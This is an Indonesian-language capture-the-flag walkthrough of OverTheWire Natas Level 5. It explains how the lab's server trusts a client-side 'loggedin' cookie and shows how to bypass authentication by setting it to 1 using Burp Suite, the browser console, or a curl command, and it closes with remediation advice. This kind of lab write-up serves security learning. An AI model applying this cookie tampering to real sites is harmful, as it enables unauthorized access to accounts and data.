---
title: "Level 5"
description: Memanipulasi cookie untuk melewati pemeriksaan autentikasi.
sidebarTitle: "Level 5 — Manipulasi Cookie"
---

## Profil

- **Target:** `http://natas5.natas.labs.overthewire.org`
- **Kredensial:** `natas5` / (password dari Level 4)

## Pengintaian

Halaman menampilkan "Access disallowed. You are not logged in." Pemeriksaan header respons mengungkapkan arahan `Set-Cookie`:

```http
Set-Cookie: loggedin=0
```

## Analisis

Cookie `loggedin` adalah flag boolean yang disimpan di sisi klien. Server mempercayai cookie ini untuk menentukan apakah pengguna telah diautentikasi. Ini adalah contoh klasik dari **manajemen status autentikasi yang tidak aman**.

## Eksploitasi

Menggunakan Burp Suite, intercept permintaan dan ubah nilai cookie sebelum meneruskan:

```http
Cookie: loggedin=1
```

Juga dapat dilakukan di browser melalui console developer tools:

```javascript
document.cookie = "loggedin=1";
location.reload();
```

Atau dengan `curl`:

```bash
curl -u natas5:$(cat password5) \
  --cookie "loggedin=1" \
  http://natas5.natas.labs.overthewire.org/
```

## Hasil

Server menerima cookie yang dimodifikasi sebagai autentik dan mengembalikan password untuk Level 6.

## Remediasi

- Jangan pernah menyimpan status autentikasi di cookie yang dapat dimodifikasi klien
- Gunakan sesi sisi server dengan identifier sesi yang ditandatangani secara kriptografis
- Validasi semua data sesi di sisi server
